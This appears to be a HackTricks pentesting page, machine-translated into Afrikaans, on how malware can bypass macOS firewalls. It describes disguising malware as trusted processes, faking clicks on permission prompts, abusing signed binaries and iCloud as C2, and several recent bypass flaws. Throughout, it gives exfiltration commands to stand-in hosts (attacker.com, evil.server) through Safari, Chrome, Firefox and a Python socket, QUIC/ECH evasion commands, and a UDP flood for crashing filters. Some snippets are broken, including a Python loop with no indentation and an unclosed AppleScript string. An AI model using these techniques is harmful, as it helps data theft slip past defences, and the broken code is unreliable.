# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gevonde tegnieke

Die volgende tegnieke is gevind wat in sommige macOS firewall-apps werk.

### Abusing whitelist names

- Byvoorbeeld deur die malware te noem met name van goed-bekende macOS-prosesse soos **`launchd`**

### Synthetic Click

- As die firewall die gebruiker vir toestemming vra, laat die malware **click on allow**

### **Use Apple signed binaries**

- Soos **`curl`**, maar ook ander soos **`whois`**

### Goed-bekende Apple-domeine

Die firewall kan verbindings na goed-bekende Apple-domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as 'n C2 gebruik word.

### Generic Bypass

Sommige idees om firewalls te probeer omseil

### Kontroleer toegelate verkeer

Om die toegelate verkeer te ken sal jou help om moontlike whitelisted domains te identifiseer of watter applications toegelaat word om toegang daartoe te kry.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-oplossings word uitgevoer deur die ondertekende toepassing **`mdnsreponder`**, wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Blaaier-apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

As jy in staat is om **inject code into a process** wat toegelaat word om met enige server te verbind, kan jy die firewall protections omseil:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Onlangse macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
In Julie 2024 het Apple 'n kritieke fout in Safari/WebKit reggestel wat die stelsel-wye “Web content filter” wat deur Screen Time ouerbeheer gebruik word, gebreek het.
'n Spesiaal saamgestelde URI (byvoorbeeld met dubbel URL-encoded “://”) word nie deur die Screen Time ACL herken nie, maar word deur WebKit aanvaar, sodat die versoek ongesiferd gestuur word. Enige proses wat 'n URL kan open (inklusief sandboxed of unsigned code) kan dus domains bereik wat uitdruklik deur die gebruiker of 'n MDM profile geblokkeer is.

Praktiese toets (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) reëlvolgorde-bug in vroeë macOS 14 “Sonoma”
Tydens die macOS 14 beta-siklus het Apple ’n regressie in die userspace-wrapper rondom **`pfctl`** bekendgestel.
Reëls wat met die `quick` sleutelwoord bygevoeg is (deur baie VPN kill-switches gebruik) is stilweg geïgnoreer, wat verkeer leaks veroorsaak het selfs wanneer ’n VPN/firewall GUI *blocked* aangetoon het. Die fout is deur verskeie VPN-verskaffers bevestig en reggestel in RC 2 (build 23A344).

Vinnige leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Misbruik van Apple-ondertekende helper-dienste (erfenis – pre-macOS 11.2)
Voor macOS 11.2 het die **`ContentFilterExclusionList`** ongeveer 50 Apple-binaries, soos **`nsurlsessiond`** en die App Store, toegelaat om alle socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.) te omseil.
Malware kon eenvoudig spawn 'n uitgeslote proses — of inject code daarin — en sy eie verkeer oor die reeds-toegelate socket tunnel.
Apple het die uitsluitinglys heeltemal verwyder in macOS 11.2, maar die tegniek is steeds relevant op stelsels wat nie opgegradeer kan word nie.

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH om Network Extension domeinfilters te omseil (macOS 12+)
NEFilter Packet/Data Providers baseer hul werking op die TLS ClientHello SNI/ALPN. Met **HTTP/3 over QUIC (UDP/443)** en **Encrypted Client Hello (ECH)** bly die SNI versleuteld, kan NetExt die stroom nie ontleed nie, en hostname-reëls faal dikwels open, wat malware toelaat om geblokkeerde domeine te bereik sonder om DNS te gebruik.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
As QUIC/ECH nog geaktiveer is, is dit 'n maklike manier om hostname-filter te omseil.

### macOS 15 “Sequoia” Network Extension onstabiliteit (2024–2025)
Vroeë 15.0/15.1-boues laat derdeparty **Network Extension**-filters (LuLu, Little Snitch, Defender, SentinelOne, ens.) crash. Wanneer die filter herbegin, verwyder macOS sy flow-reëls en baie produkte gaan fail‑open. Om die filter te oorlaai met duisende kort UDP flows (of deur QUIC/ECH af te dwing) kan die crash herhaaldelik veroorsaak en 'n venster skep vir C2/exfil terwyl die GUI steeds sê die firewall is aktief.

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wenke vir gereedskap op moderne macOS

1. Inspekteer huidige PF-reëls wat GUI-firewalls genereer:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumereer binaries wat reeds die *outgoing-network* entitlement besit (nuttig vir piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registreer programmaties jou eie Network Extension content filter in Objective-C/Swift.
'n minimale rootless PoC wat pakkette na 'n plaaslike socket stuur, is beskikbaar in Patrick Wardle se **LuLu** source code.

## Verwysings

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
